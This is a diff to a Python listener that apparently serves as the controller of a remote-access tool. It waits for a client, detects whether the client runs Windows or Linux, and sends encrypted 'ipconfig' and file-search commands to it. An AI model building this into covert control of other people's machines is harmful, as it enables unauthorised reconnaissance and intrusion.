@@ -4,6 +4,8 @@ from tools.env import EnvReader
 from commands.help import help
 import json
 from time import sleep
+from commands.Windows import WindowsCommands
+from commands.Linux import LinuxCommands
 
 
 
@@ -14,16 +16,22 @@ def main():
         port=int(env.get("SERVER_PORT"))
     )
 
+    print("Wait connection...")
+
     while True:
         client_init = listener.init_listen()
         if client_init is not None:
             client_addr = client_init["addr"][0]
             data = json.loads(client_init["data"])
-            client_os = data["params"]
+            if data["params"] == "Windows":
+                commands_trsl = WindowsCommands()
+            else:
+                commands_trsl = LinuxCommands()
             break
         else:
             print(client_init)
 
+    print("Connection received !")
     sleep(3)
 
     listener.connect(client_addr)
@@ -47,15 +55,25 @@ def main():
             listener.stop()
             break
 
-        elif command == "download" or command == "ipconfig":
+        elif command == "ipconfig" or command == "find":
+            
+            match command:
+                case "ipconfig":
+                    command_trsl = commands_trsl.ipconfig()
+                case "find":
+                    command_trsl =  commands_trsl.search(params)
+
+
+
             request = json.dumps({
                 'type': 'command',
-                'action': command,
-                'params': params
+                'action': command_trsl
             }).encode('utf-8')
+
             response = listener.prompt(cipher.encrypt_message(request))
             decrypted = cipher.decrypt_message(response)
             result = json.loads(decrypted)
+            
             print(result["response"].encode('utf-8'))
 
         else:
